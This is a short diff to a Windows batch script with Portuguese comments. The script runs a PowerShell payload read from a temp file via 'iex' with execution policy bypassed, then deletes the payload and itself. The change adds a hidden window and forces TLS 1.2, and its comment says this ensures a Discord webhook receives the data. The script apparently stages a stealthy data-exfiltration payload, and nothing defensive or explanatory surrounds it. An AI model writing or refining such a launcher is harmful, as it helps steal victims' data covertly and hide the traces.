@@ -1,7 +1,7 @@
 @echo off
 set "f=%TEMP%\f.log"
 timeout /t 2 /nobreak >nul
-:: Execução em modo visível para diagnóstico de erros
-powershell -ExecutionPolicy Bypass -Command "$s=Get-Content '%f%' -Raw; iex $s"
+:: Execução forçando TLS 1.2 para garantir que o Webhook do Discord recebe os dados
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $s=Get-Content '%f%' -Raw; iex $s"
 del "%f%"
 del "%~f0"
